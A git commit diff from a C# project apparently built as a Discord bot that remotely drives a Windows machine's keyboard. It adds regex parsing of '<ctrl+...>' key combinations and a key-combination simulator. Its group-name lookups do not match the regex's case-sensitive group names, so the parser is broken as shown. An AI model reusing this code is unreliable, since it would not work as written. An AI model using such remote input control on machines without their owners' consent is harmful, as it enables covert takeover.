39220f5ae3f435adfa8ff5b253d844409e08c71c
Nakize <wiktor.slodkowski.2004@gmail.com>
2023-11-24 00:27:37 +0100

    Dodano wstęp do bardziej zaawansowanego /keyboard

--- Paroxysm/Hooks/Actions/KeyboardAction.cs
+++ Paroxysm/Hooks/Actions/KeyboardAction.cs
@@ -3,11 +3,49 @@ using Discord;
 using Discord.WebSocket;
 using Paroxysm.Discord;
 using WindowsInput;
+using System.Text.RegularExpressions;
+using WindowsInput.Native;
 
 namespace Paroxysm.Hooks.Actions;
 
 public static class KeyboardAction
 {
+    private static readonly string pattern = @"<(?<TextA>(ctrl|alt|shift))\+(?<TextB>[^>]*)>";
+
+    private static List<Tuple<string, string>> FindAndSplit(string input)
+    {
+        List<Tuple<string, string>> result = new List<Tuple<string, string>>();
+
+        Regex regex = new(pattern);
+
+        MatchCollection matches = regex.Matches(input);
+
+        foreach (Match match in matches)
+        {
+            string type = match.Groups["textA"].Value;
+            string keys = match.Groups["textB"].Value;
+            
+            result.Add(new Tuple<string, string>(type, keys));
+        }
+
+        return result;
+    }
+
+    private static void SimulateKeyCombination(char[] keys, VirtualKeyCode modifierKey)
+    {
+        InputSimulator simulator = new();
+
+        simulator.Keyboard.KeyDown(modifierKey);
+        foreach (var key in keys)
+        {
+            simulator.Keyboard.TextEntry(key);
+        }
+        
+        Thread.Sleep(50);
+
+        simulator.Keyboard.KeyUp(modifierKey);
+    }
+    
     private static void SimulateKeyPress(string inputText)
     {
         InputSimulator simulator = new();
